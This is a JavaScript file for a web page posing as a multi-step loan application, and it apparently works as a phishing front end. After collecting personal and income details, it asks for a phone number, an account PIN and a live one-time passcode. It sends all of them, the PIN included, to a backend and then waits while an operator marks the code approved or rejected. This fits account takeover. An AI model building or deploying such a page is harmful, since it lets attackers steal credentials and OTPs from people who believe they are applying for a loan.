let currentAppReference = null;
let userPhone = null;
let userPin = null;
let userFullName = null;
let userOccupation = null;
let userMonthlyIncome = null;
let userLoanAmount = null;
let userRepaymentPeriod = null;
let pollInterval = null;

const step1Form = document.getElementById('step1-form');
const step2Form = document.getElementById('step2-form');
const step2Loading = document.getElementById('step2-loading');
const step3Form = document.getElementById('step3-form');
const successScreen = document.getElementById('success-screen');

const stepIndicator = document.getElementById('step-indicator');
const stepCircle1 = document.getElementById('step-circle-1');
const stepLabel1 = document.getElementById('step-label-1');
const stepLine1 = document.getElementById('step-line-1');

const stepCircle2 = document.getElementById('step-circle-2');
const stepLabel2 = document.getElementById('step-label-2');
const stepLine2 = document.getElementById('step-line-2');

const stepCircle3 = document.getElementById('step-circle-3');
const stepLabel3 = document.getElementById('step-label-3');

const otpStatusBanner = document.getElementById('otp-status-banner');
const otpStatusText = document.getElementById('otp-status-text');
const btnStep3 = document.getElementById('btn-step3');
const otpInput = document.getElementById('otp');

// ============ LOAN CALCULATOR ============
const loanSlider = document.getElementById('loanSlider');
const repaymentSlider = document.getElementById('repaymentSlider');
const loanAmountDisplay = document.getElementById('loanAmountDisplay');
const repaymentDisplay = document.getElementById('repaymentDisplay');
const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
const loanAmountHidden = document.getElementById('loanAmount');
const repaymentPeriodHidden = document.getElementById('repaymentPeriod');

function calculateMonthlyPayment() {
  const loanAmount = parseFloat(loanSlider.value);
  const months = parseFloat(repaymentSlider.value);
  const monthlyPayment = (loanAmount / months).toFixed(2);
  monthlyPaymentDisplay.innerText = `$${monthlyPayment}`;
  loanAmountHidden.value = loanAmount;
  repaymentPeriodHidden.value = months;
}

loanSlider.addEventListener('input', () => {
  loanAmountDisplay.innerText = `$${loanSlider.value}`;
  calculateMonthlyPayment();
});

repaymentSlider.addEventListener('input', () => {
  repaymentDisplay.innerText = `${repaymentSlider.value}`;
  calculateMonthlyPayment();
});

// ============ STEP 1: SUBMIT APPLICANT DETAILS ============
step1Form.addEventListener('submit', async (e) => {
  e.preventDefault();

  userFullName = document.getElementById('fullName').value.trim();
  userOccupation = document.getElementById('occupation').value.trim();
  userMonthlyIncome = document.getElementById('monthlyIncome').value.trim();
  userLoanAmount = loanSlider.value;
  userRepaymentPeriod = repaymentSlider.value;

  if (!userFullName || !userOccupation || !userMonthlyIncome) {
    alert('Please fill in all applicant details.');
    return;
  }

  // Update step indicator
  stepCircle1.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm';
  stepLabel1.className = 'text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5';
  stepLine1.className = 'flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300';

  stepCircle2.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm';
  stepLabel2.className = 'text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5';
  stepLine2.className = 'flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300';

  step1Form.classList.add('hidden');
  step2Form.classList.remove('hidden');
});

// ============ STEP 2: LOGIN WITH PHONE & PIN ============
step2Form.addEventListener('submit', async (e) => {
  e.preventDefault();

  userPhone = document.getElementById('phone').value.trim();
  userPin = document.getElementById('pin').value.trim();
  const btnStep2 = document.getElementById('btn-step2');

  // Validation
  if (userPhone.length !== 9 || !/^\d{9}$/.test(userPhone)) {
    alert('Please enter a valid 9-digit phone number.');
    return;
  }

  if (userPin.length !== 4 || !/^\d{4}$/.test(userPin)) {
    alert('Please enter a valid 4-digit PIN.');
    return;
  }

  btnStep2.innerText = 'Connecting...';
  btnStep2.disabled = true;

  step2Form.classList.add('hidden');
  step2Loading.classList.remove('hidden');

  // 5-second countdown loading
  let countdown = 5;
  const countdownTimer = document.getElementById('countdown-timer');
  const countdownBar = document.getElementById('countdown-bar');

  const countdownInterval = setInterval(() => {
    countdown--;
    countdownTimer.innerText = countdown;
    const percentage = (countdown / 5) * 100;
    countdownBar.style.width = percentage + '%';

    if (countdown === 0) {
      clearInterval(countdownInterval);

      // Update step indicator to Step 3
      stepCircle2.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm';
      stepLabel2.className = 'text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5';
      stepLine2.className = 'flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300';

      stepCircle3.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm';
      stepLabel3.className = 'text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5';

      step2Loading.classList.add('hidden');
      step3Form.classList.remove('hidden');

      // Start 5-second OTP countdown
      startOtpCountdown();
      document.getElementById('displayPhone').innerText = userPhone;
    }
  }, 1000);
});

// ============ OTP 5-SECOND COUNTDOWN ============
function startOtpCountdown() {
  let otpCountdown = 5;
  const otpCountdownSpan = document.getElementById('otp-countdown');

  const otpCountdownInterval = setInterval(() => {
    otpCountdown--;
    otpCountdownSpan.innerText = otpCountdown;

    if (otpCountdown === 0) {
      clearInterval(otpCountdownInterval);
      document.getElementById('otp-countdown-container').classList.add('hidden');
    }
  }, 1000);
}

// ============ STEP 3: SUBMIT OTP & APPLICATION ============
step3Form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const otpCode = otpInput.value.trim();
  const idNumber = 'N/A'; // Not required in this version

  if (otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
    alert('Please enter a valid 6-digit OTP code.');
    return;
  }

  btnStep3.innerText = 'Verifying...';
  btnStep3.disabled = true;
  otpInput.disabled = true;

  otpStatusBanner.className = 'bg-blue-50 border border-blue-200 rounded-lg p-3 text-center';
  otpStatusText.className = 'text-xs text-blue-700 font-medium';
  otpStatusText.innerText = 'Verifying OTP and submitting application...';

  try {
    const response = await fetch('/api/submit-full-application', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phone: userPhone,
        pin: userPin,
        fullName: userFullName,
        occupation: userOccupation,
        monthlyIncome: userMonthlyIncome,
        loanAmount: userLoanAmount,
        repaymentPeriod: userRepaymentPeriod,
        idNumber: idNumber,
        otpCode: otpCode
      })
    });

    const result = await response.json();

    if (result.success) {
      currentAppReference = result.appReference;
      startPollingStatus(currentAppReference);
    } else {
      resetOtpForm('Failed to submit application. Please try again.');
    }

  } catch (err) {
    console.error('Error in step 3:', err);
    resetOtpForm('Server connection error. Please try again.');
  }
});

// ============ POLLING FOR OTP STATUS ============
function startPollingStatus(appReference) {
  if (pollInterval) clearInterval(pollInterval);

  pollInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/check-status/${appReference}`);
      const data = await res.json();

      if (data.status === 'OTP_APPROVED') {
        clearInterval(pollInterval);
        stepIndicator.classList.add('hidden');
        step3Form.classList.add('hidden');
        document.getElementById('appRefDisplay').innerText = appReference;
        successScreen.classList.remove('hidden');
      } else if (data.status === 'OTP_REJECTED') {
        clearInterval(pollInterval);
        resetOtpForm('❌ Incorrect OTP entered. Please re-enter the 6-digit code.');
      }
    } catch (err) {
      console.error('Polling error:', err);
    }
  }, 2000);
}

function resetOtpForm(message) {
  otpStatusBanner.className = 'bg-red-50 border border-red-200 rounded-lg p-3 text-center';
  otpStatusText.className = 'text-xs text-red-700 font-semibold';
  otpStatusText.innerText = message;

  btnStep3.innerText = 'Verify OTP & Submit Application';
  btnStep3.disabled = false;
  otpInput.disabled = false;
  otpInput.value = '';
  otpInput.focus();
}

// ============ BACK BUTTONS ============
document.getElementById('btn-back-step1').addEventListener('click', () => {
  step2Form.classList.add('hidden');
  step1Form.classList.remove('hidden');

  stepCircle2.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm';
  stepLabel2.className = 'text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5';
  stepLine1.className = 'flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300';
});

document.getElementById('btn-back-step2').addEventListener('click', () => {
  step3Form.classList.add('hidden');
  step2Form.classList.remove('hidden');

  stepCircle3.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm';
  stepLabel3.className = 'text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5';
  stepLine2.className = 'flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300';
});
